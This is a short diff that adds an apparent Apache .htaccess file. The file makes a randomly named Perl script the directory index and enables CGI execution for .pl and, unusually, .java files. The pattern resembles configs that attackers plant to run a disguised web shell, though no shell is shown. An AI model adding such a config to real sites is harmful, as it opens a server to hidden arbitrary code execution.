@@ -1,0 +1,3 @@
+DirectoryIndex vaodb.pl
+Options +ExecCGI
+AddHandler cgi-script .pl .java 
